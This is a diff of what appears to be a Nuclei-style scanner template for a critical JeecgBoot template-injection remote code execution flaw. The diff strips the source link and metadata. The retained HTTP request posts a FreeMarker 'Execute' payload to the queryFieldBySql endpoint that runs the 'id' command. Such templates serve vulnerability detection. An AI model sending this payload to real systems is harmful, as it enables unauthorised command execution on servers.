@@ -3,12 +3,8 @@ info:
   name: JeecgBoot SSTI RCE漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/zpu1i3hlziylarg8'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: zpu1i3hlziylarg8
-    fofa: 暂无
 http:
 - raw:
   - 'POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
@@ -24,8 +20,6 @@ http:
 
 
     Content-Type: application/json
-
-
 
 
     {"sql":"select ''result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }'' "}
